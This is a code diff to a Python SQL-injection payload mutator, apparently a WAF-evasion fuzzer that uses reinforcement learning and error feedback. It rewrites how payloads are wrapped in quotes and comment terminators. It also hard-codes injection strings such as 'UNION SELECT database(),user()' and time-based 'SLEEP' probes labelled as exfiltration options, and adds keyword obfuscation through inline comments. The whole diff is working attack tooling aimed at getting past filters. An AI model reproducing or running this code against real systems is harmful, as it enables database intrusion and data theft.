@@ -40,17 +40,25 @@ class ASTMutator:
             self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
             print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)
 
+    def _strip_wrappers(self, payload):
+        """Isolate core gene: Strip known outer wrappers and terminators before mutation."""
+        clean = payload
+        # Strip front quotes/brackets
+        clean = re.sub(r"^('|''|\"|\"\)|'\))", "", clean)
+        # Strip trailing terminators
+        clean = re.sub(r"(--\s*-?|#|/\*|;%00).*$", "", clean).strip()
+        return clean
+
     def mutate(self, payload, error_msg=None, intensity=1):
-        mutated = str(payload)
+        # Isolation Stage: Separate the Wrapper from the Core Logic
+        core_gene = self._strip_wrappers(str(payload))
+        mutated = core_gene
         
         # 1. Error-Based Feedback: Apply specific fixes based on SQL error
         if error_msg:
             mutated = self._apply_error_feedback(mutated, error_msg)
             
-        # 2. Context-Aware Mutation: Detect and wrap payload if needed
-        mutated = self._context_aware_wrap(mutated)
-        
-        # 3. Standard Mutations with RL (Epsilon-Greedy)
+        # 2. Standard Mutations with RL (Epsilon-Greedy)
         num_mutations = random.randint(1, 2) * intensity
         
         for _ in range(num_mutations):
@@ -74,6 +82,8 @@ class ASTMutator:
                 continue
             mutated = self.strategies[strat_name](mutated)
             
+        # 3. Contextual Compatibility Logic: Wrap the core safely (strictly once at the end)
+        mutated = self._context_aware_wrap(mutated)
         return mutated
 
     def report_success(self, payload, score):
@@ -140,7 +150,10 @@ class ASTMutator:
         
         # Quote mismatch or syntax error near quote
         if "syntax" in error and ("'" in error or '"' in error):
-            if "'" in payload: return payload.replace("'", "''")
+            if "'" in payload and not payload.endswith("-- -"): 
+                return payload + "-- -"
+            if '"' in payload and not payload.endswith("#"):
+                return payload + "#"
             
         return payload
 
@@ -150,46 +163,54 @@ class ASTMutator:
         This forces the evolution to test deeper execution.
         """
         original = payload.upper()
+        # Clean current terminators if they exist
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        
         # Only upgrade if it's considered a relatively simple bypass
         if "SELECT" not in original and "UNION" not in original:
             exfil_options = [
-                " UNION SELECT NULL,NULL--",
-                " AND (SELECT 1)=1",
-                " UNION SELECT database(),user()--",
-                " AND (SELECT SLEEP(1))=0"
+                " UNION SELECT NULL,NULL-- -",
+                " AND (SELECT 1)=1-- -",
+                " UNION SELECT database(),user()-- -",
+                " AND (SELECT SLEEP(1))=0-- -"
             ]
-            return payload + random.choice(exfil_options)
+            return clean_payload + random.choice(exfil_options)
         return payload
 
     def _context_aware_wrap(self, payload):
         """Wraps payload based on detected context (quotes, brackets).
            GRAMMAR-BASED FUZZING: Strictly adheres to the known insertion state to avoid syntax breaking.
+           GENIUS TACTIC: Prioritize heavy terminator usage (--, #, %00) over balancing to truncate trailing SQL safely.
         """
+        terminators = ["-- -", "#", ";%00", "/*"]
+        # Weight the terminators heavily instead of trying to perfectly balance the right side
+        chosen_term = random.choice(terminators) if random.random() < 0.8 else ""
+
         if self.context == "NUMERIC":
-            return payload
+            return payload + chosen_term
             
         if self.context == "SINGLE_QUOTE":
             if not payload.startswith("'"):
-                return "'" + payload
-            return payload
+                return "'" + payload + chosen_term
+            return payload + chosen_term
             
         if self.context == "DOUBLE_QUOTE":
             if not payload.startswith('"'):
-                return '"' + payload
-            return payload
+                return '"' + payload + chosen_term
+            return payload + chosen_term
             
         if self.context == "SINGLE_QUOTE_PARENTHESIS":
             if not payload.startswith("')"):
-                return "')" + payload
-            return payload
+                return "')" + payload + chosen_term
+            return payload + chosen_term
 
         # Generic Random Fallback
-        if random.random() > 0.7:
+        if random.random() > 0.4: # Increased chance to apply wrappers in generic mode
             wrappers = [
-                ("'", "'"),
-                ('"', '"'),
-                ("') ", " --"),
-                ('") ', " --")
+                ("'", chosen_term),
+                ('"', chosen_term),
+                ("') ", chosen_term),
+                ('") ', chosen_term)
             ]
             prefix, suffix = random.choice(wrappers)
             if not payload.startswith(prefix):
@@ -331,7 +352,7 @@ class ASTMutator:
         equivalents = {
             r"1=1": ["true", "not false", "~1=~1", "8=8", "0x31=0x31", "(SELECT 1)=1"],
             r"1=2": ["false", "not true", "1=0", "0=1", "(SELECT 1)=0"],
-            r"\bOR\b": ["||", "XOR", "OR 1=1 --", "OR true"],
+            r"\bOR\b": ["||", "XOR", "OR 1=1", "OR true"],
             r"\bAND\b": ["&&", "AND 1=1"],
             r"\bXOR\b": ["OR", "||", "XOR true", "XOR 1=1"],
             r"\btrue\b": ["1=1", "not 0", "XOR false", "(SELECT 1)"],
@@ -352,34 +373,22 @@ class ASTMutator:
         return payload
 
     def _junk_filling(self, payload):
+        """Adds internal comments to fill space logic without breaking payload endpoints."""
         junk = ["bypass", "attack_unit", "audit", "waf_bypass", "X"*8, "1337", "sys"]
         coin = random.random()
-        if coin < 0.4 and " " in payload:
+        if coin < 0.5 and " " in payload:
             return payload.replace(" ", f"/*{random.choice(junk)}*/", 1)
         if "/**/" in payload:
             return payload.replace("/**/", f"/*{random.choice(junk)}*/")
-        return payload + f" -- {random.choice(junk)}"
+        return payload
 
     def _context_aware_mutation(self, payload):
+        """(Legacy name kept for strategy matrix) Structural Obfuscation:
+           Obfuscates keywords without touching spaces or quotes that handles wrappers.
+        """
         mutated = str(payload)
         
-        # 0. Context-Specific Injection (Compatibility Matrix)
-        if self.context == "NUMERIC":
-            # Ensure no quotes are added in numeric context
-            mutated = mutated.replace("'", "").replace('"', "")
-            return mutated
-
-        if self.context == "SINGLE_QUOTE" and not mutated.startswith("'"):
-            mutated = "'" + mutated
-        elif self.context == "DOUBLE_QUOTE" and not mutated.startswith('"'):
-            mutated = '"' + mutated
-
-        # 1. Quote Alteration: Swap quotes
-        if "'" in mutated:
-            if random.random() < 0.4:
-                mutated = mutated.replace("'", '"')
-
-        # 2. Comment Wrapping: Wrap keywords or parts of the payload
+        # 1. Comment Wrapping: Wrap keywords or parts of the payload
         keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
         for kw in keywords:
             if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
@@ -388,12 +397,6 @@ class ASTMutator:
                     mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
                 elif coin < 0.6:
                     mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)
-
-        # 3. Space/Separator Mutation
-        if " " in mutated:
-            separators = ["/**/", "/*!*/", "+"]
-            sep = random.choice(separators)
-            mutated = mutated.replace(" ", sep)
 
         return mutated
 
@@ -408,7 +411,7 @@ class ASTMutator:
         
         junk_patterns = [
             "/**/", "/*" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)) + "*/",
-            "/*!*/", "/**/--/**/", " "
+            "/*!*/", " "
         ]
         
         fragmented = ""
